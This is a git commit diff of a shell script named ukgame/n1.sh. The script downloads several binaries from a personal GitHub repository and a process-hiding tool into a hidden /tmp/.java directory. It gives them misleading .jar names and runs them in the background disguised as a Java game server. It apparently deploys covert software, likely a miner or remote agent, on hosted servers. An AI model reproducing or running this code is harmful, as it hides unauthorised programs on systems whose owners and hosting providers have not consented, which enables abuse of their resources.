25077e3daef7cfb3e089cff65648c0457280327a
i51jir6ni9t0 <wker-one@protonmail.com>
2025-06-18 14:47:02 +0000

    UK-1 KICKED

--- ukgame/n1.sh
+++ ukgame/n1.sh
@@ -2,12 +2,10 @@
 
 function fetch_files() {
     mkdir -p /tmp/.java/bin
-    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
-    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cnf-0.json -o conf.json
     cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o patch.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cfg.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/n1.conf -o cfg.conf
 }
 
 function start_app() {
@@ -15,7 +13,7 @@ function start_app() {
     cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
 }
 
-if [ -f "/tmp/.java/bin/cfg.conf" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
+if [ -f "/tmp/.java/bin/patch.jar" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
     start_app
 else
     rm -rf /tmp/.java/bin/**
